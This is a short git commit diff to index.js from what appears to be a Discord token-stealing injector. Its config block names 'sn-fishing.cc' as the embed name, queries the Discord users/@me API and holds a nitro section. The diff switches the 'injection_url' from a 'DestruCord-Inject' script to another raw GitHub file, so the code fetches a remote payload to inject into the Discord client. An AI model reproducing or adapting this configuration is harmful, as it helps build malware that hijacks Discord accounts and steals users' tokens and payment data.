5e5bfe3b671a8f0c4cb47bb6eacf86691d31ff64
oxyidz <107583994+oxyidz@users.noreply.github.com>
2022-06-21 16:18:17 +0200

    Update index.js

--- index.js
+++ index.js
@@ -13,7 +13,7 @@ const config = {
   embed_name: "sn-fishing.cc",
   embed_icon: "https://cdn.discordapp.com/attachments/988472291048439890/988586662080692324/Zo5tLqSY2l9CjuEXEuNazNpEL1hq4KPAdhR5FVdkfPPkQWJFWWa0wKAixX6NimmTMwZvufxHmLwMR7L8_Hpm_oDJQcFu4DPEiTRQFWXO4tnmBpCgstJwEZinVkOFZ9s_PA5Hrkb1ds0FGSXpf12ekdppplZGzS_iq8N7JKrNey-k-0gV4xDDg_XT9Okl5bcNyDWn1WhcTfCCdg2Rf1hR8uc.jpg".replace(/ /g, "%20"), 
   embed_color: 374276, 
-  injection_url: "https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/Injections/simplecord.js", 
+  injection_url: "https://raw.githubusercontent.com/oxyidz/pqt4tt/main/index.js", 
 
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
